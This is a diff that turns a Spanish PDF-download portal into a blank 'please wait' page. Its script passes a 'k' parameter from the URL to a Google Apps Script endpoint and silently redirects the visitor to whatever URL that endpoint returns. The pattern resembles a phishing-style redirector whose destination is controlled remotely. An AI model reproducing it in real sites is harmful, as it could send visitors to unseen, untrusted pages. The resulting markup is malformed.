@@ -1,18 +1,46 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Portal de Documentos PDF</title>
-  <style>
-    body { font-family: Arial, sans-serif; padding: 2rem; }
-    a { display: block; margin: 1rem 0; color: #0077cc; text-decoration: none; }
-  </style>
-</head>
-<body>
-  <h1>📄 Documentos Disponibles</h1>
+  <meta  name="viewport" content="width=device-width, initial-scale=1.0" charset="utf-8">
+  <title></title>
 
-  <a href="pdfs/informe1.pdf" target="_blank">📘 Informe 1</a>
-  <a href="pdfs/reporte2.pdf" target="_blank">📗 Reporte 2</a>
-  <a href="pdfs/archivo3.pdf" target="_blank">📕 Archivo 3</a>
+  <link rel="stylesheet" href="style.css">
+</head>
+  <a>Espere...</a>
+<body>
+  <script>
+    const AS_URL_BASE = "https://script.google.com/a/~/macros/s/AKfycbxBoMgdYImMAwiF03gIh9tUvoL182jtdOWZSA8QTI9wmM6tTv2vxvcZJJ_yyZ45wlJzqw/exec";
+    
+    var url = document.location.href;
+    var k = url.substr(url.lastIndexOf("k=")+2);
+    
+    if(k){
+      fetch(AS_URL_BASE+'?k='+k)
+      .then(r => r.text())
+      .then((r) => {
+        console.log(r);
+        //document.write(r);
+        if(r){
+          document.location.replace(r);
+        }
+      })
+      .catch(err => console.log(err))
+    }
+
+  </script>
+<div class="vertical">
+      
+    <div class="box">
+      <img src="Data.png" class="responsive" ></img>
+      
+</div>
+<div class=" load">
+  <div class="lds-ellipsis"><div></div><div></div><div></div><div></div></div>
+
+</div>
+  
+</body>
+</html>
+  
 </body>
 </html>
